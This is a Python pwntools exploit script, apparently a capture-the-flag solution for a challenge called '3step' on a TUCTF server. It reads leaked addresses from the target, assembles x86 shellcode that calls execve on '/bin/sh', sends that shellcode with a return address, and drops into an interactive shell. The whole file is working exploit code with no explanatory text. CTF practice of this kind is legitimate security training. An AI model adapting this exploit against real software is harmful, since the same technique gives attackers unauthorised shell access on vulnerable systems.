from pwn import *

e = ELF("./3step")

context.binary = e.path

if "--remote" in sys.argv:
  p = remote("chal.tuctf.com", 30504)
else:
  p = process(e.path)

print(shellcraft.sh())

p.recvuntil("0x")
a = int(p.recvline(), 16)

p.recvuntil("0x")
b = int(p.recvline(), 16)

goal = asm("""
  mov ebx, """ + hex(b) + """
  xor ecx, ecx
  xor edx, edx
  push SYS_execve
  pop eax
  int 0x80

""")

p.sendlineafter(":", goal)
p.sendlineafter(":", "/bin/sh\x00")
p.sendlineafter(":", p32(a))

p.interactive()
